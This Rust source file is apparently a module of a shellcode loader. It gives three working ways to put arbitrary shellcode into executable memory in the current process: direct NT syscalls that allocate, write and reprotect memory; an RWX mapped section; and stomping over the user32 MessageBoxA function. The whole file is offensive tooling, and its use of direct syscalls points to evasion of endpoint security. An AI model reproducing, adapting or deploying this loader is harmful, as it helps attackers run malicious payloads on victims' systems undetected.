use std::ffi::c_void;

// =======================================================================================================
// INJECTION METHOD: DEFAULT LOCAL
// =======================================================================================================

#[cfg(feature = "InjectionDefaultLocal")]
use rust_syscalls::syscall;

#[cfg(feature = "InjectionDefaultLocal")]
pub fn inject_default_local(bytes_to_load: &[u8]) -> Result<*mut c_void, i32> {
    unsafe {
        let mut base_address: *mut c_void = std::ptr::null_mut();
        let mut region_size: usize = bytes_to_load.len();
        let allocation_type: u32 = 0x1000;
        let mut return_value: i32;
        
        // Allocate memory with RW permissions
        return_value = syscall!("NtAllocateVirtualMemory", -1isize, &mut base_address, 0, &mut region_size, allocation_type, 0x04);
        
        // Write shellcode to allocated memory
        let shellcode_ptr = bytes_to_load.as_ptr() as *const c_void;
        let mut bytes_written: usize = 0;
        return_value = syscall!("NtWriteVirtualMemory", -1isize, base_address, shellcode_ptr, bytes_to_load.len(), &mut bytes_written);
        
        // Change memory protection to RX
        let mut protectaddress_to_protect: *mut c_void = base_address;
        let mut size_to_protect = bytes_to_load.len();
        let mut oldprotect: u32 = 0;
        return_value = syscall!("NtProtectVirtualMemory", -1isize, &mut protectaddress_to_protect, &mut size_to_protect, 0x20, &mut oldprotect);
        
        Ok(base_address)
    }
}

// =======================================================================================================
// INJECTION METHOD: MAPPING LOCAL
// =======================================================================================================

#[cfg(feature = "InjectionMappingLocal")]
use std::ptr::copy_nonoverlapping;

#[cfg(feature = "InjectionMappingLocal")]
use rust_syscalls::syscall;

#[cfg(feature = "InjectionMappingLocal")]
pub fn inject_mapping_local(shellcode: &[u8]) -> Result<*mut c_void, i32> {
    unsafe {
        let mut section_handle: *mut c_void = std::ptr::null_mut();
        let mut max_size: u64 = shellcode.len() as u64;

        // Create a section object using NtCreateSection
        let status = syscall!(
            "NtCreateSection",
            &mut section_handle as *mut *mut c_void,
            0x000F001Fu32, // SECTION_ALL_ACCESS
            std::ptr::null::<c_void>(),
            &mut max_size as *mut u64,
            0x40u32, // PAGE_EXECUTE_READWRITE
            0x8000000u32, // SEC_COMMIT
            std::ptr::null::<c_void>()
        );

        // Map the section into the process's address space using NtMapViewOfSection
        let mut base_address: *mut c_void = std::ptr::null_mut();
        let mut view_size: usize = shellcode.len();
        
        // NtMapViewOfSection parameters
        let status = syscall!(
            "NtMapViewOfSection",
            section_handle,
            -1isize, // Current process
            &mut base_address as *mut *mut c_void,
            0usize,
            0usize,
            std::ptr::null_mut::<u64>(),
            &mut view_size as *mut usize,
            2u32, // ViewUnmap
            0u32,
            0x40u32 // PAGE_EXECUTE_READWRITE
        );

        // Copy the shellcode into the mapped memory
        copy_nonoverlapping(
            shellcode.as_ptr(),
            base_address as *mut u8,
            shellcode.len(),
        );

        // Close the section handle
        syscall!("NtClose", section_handle);

        Ok(base_address)
    }
}

// =======================================================================================================
// INJECTION METHOD: FUNCTION STOMPING
// =======================================================================================================

#[cfg(feature = "InjectionFunctionStomping")]
use std::ptr::copy_nonoverlapping;

#[cfg(feature = "InjectionFunctionStomping")]
use windows_sys::Win32::{
    Foundation::HMODULE,
    System::{
        LibraryLoader::{GetProcAddress, LoadLibraryA},
        Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_READWRITE},
    },
};

#[cfg(feature = "InjectionFunctionStomping")]
use windows_sys::s;

#[cfg(feature = "InjectionFunctionStomping")]
pub fn inject_function_stomping(shellcode: &[u8]) -> Result<*mut c_void, i32> {
    unsafe {
        // Load user32.dll
        let h_module = LoadLibraryA(s!("user32"));
        let func_address = GetProcAddress(h_module, s!("MessageBoxA"));
        let func_ptr = func_address.unwrap() as *mut c_void;
        // Change memory protection to RW
        let mut old_protect: u32 = 0;
        if VirtualProtect(
            func_ptr,
            shellcode.len(),
            PAGE_READWRITE,
            &mut old_protect,
        ) == 0 {
            return Err(-1);
        }

        // Overwrite the function with shellcode
        copy_nonoverlapping(
            shellcode.as_ptr(),
            func_ptr as *mut u8,
            shellcode.len(),
        );

        // Restore memory protection to RX
        if VirtualProtect(
            func_ptr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == 0 {
            return Err(-1);
        }

        Ok(func_ptr)
    }
}
